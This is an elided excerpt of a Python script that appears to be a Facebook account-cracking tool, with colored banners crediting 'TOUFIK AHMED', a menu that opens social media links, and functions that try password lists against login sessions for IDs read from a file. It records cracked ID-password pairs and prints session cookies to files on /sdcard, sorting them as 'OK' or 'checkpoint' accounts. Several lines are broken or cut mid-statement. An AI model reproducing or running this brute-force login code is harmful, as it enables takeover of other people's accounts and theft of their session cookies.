...
\033[38;5;46m    S      S     S   S     S  S      S S     b 
\033[38;5;46m    P       "sss"     "sss"   P      P P     P 195m╔════════════════════════════════════════════════════╗
\033[38;5;195m║ \033[38;5;46mTOUFIK AHMED \033[1;93m•\033[38;5;46m GITHUB TESTOURX\033[1;93m•\033[38;5;46m VARSION 0.0.1\033[38;5;195m║
\033[38;5;195m╚════════════════════════════════════════════════════╝""")
def linex1():
	print('\033[38;5;195m╔════════════════════════════════════════════════════╗')
def linex2():
...
def mainx():
    ...
    if mahin in ["0","07"]:
     ...
     os.system("xdg-open https://github.com/testourx");mainx()
    elif mahin in ["3","03"]:
     os.system("xdg-open nhttps://www.facebook.com/toufik.hossain.17x {H}FB-TOUFIK {P}Terminal ');os.system("xdg-open https://www.facebook.com/FB.PARVEZ.MAHIN.NAME.TOH.SONSO?mibextid=ZbWKwL");time.sleep(3);os.system('xdg-open https://www.facebook.com/toufik.hossain.17x');exit()
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/toufik.hossain.17x");mainx()
def mainx2():
    os.system("clear")
    banner()
    linex1()
...
# FILE CRACK -- MAIN DEF #
def cr():
            os.system('clear');banner();print(f'{dot}EXAMPLE :  /sdcard/TOUFIK.txt{P}{H}{P} ');time.sleep(0.05);linex3()
            try:
...
def m5(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P}[\033[1;28mTOUFIK-CP{P}] \033[1;28m{idf} • {pw}{xxx}')
             open(' /sdcard/TOUFIK-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P}[{H}TOUFIK-OK{P}] {GREEN}{idf} • {pw}{xxx}');linex3()
                if 'y' in cokix:
                 print(f'\r\33[1;92m[COOKIES] = {H}'+kukis);linex3()
                open(' /sdcard/TOUFIK-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def m3(idf,pw):
 ...
 global ok
 global agents
 animasi = random.choice(["\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mPARVEZ","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK","\33[1;32mTOUFIK"])
 sys.stdout.write(f'\r{P}[{animasi}{H}{P}] [{B}%s{P}]{U}- -{H}OK{P}[{GREEN}%s{P}]'%(loop,ok)),
 try:
  for ps in pw:
   session = requests.Session()
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m[TOUFIK-OK] '+user+' • '+ps)
    if 'y' in cokix:
     print(f'\33[1;92m[COOKIES] = {H}'+coki)
     linex3()
    ok+=1 
    open(' /sdcard/TOUFIK-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P}[\033[1;30mTOUFIK-CP{P}] \033[1;30m{idf} • {ps}{xxx}')
    open(' /sdcard/TOUFIK-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
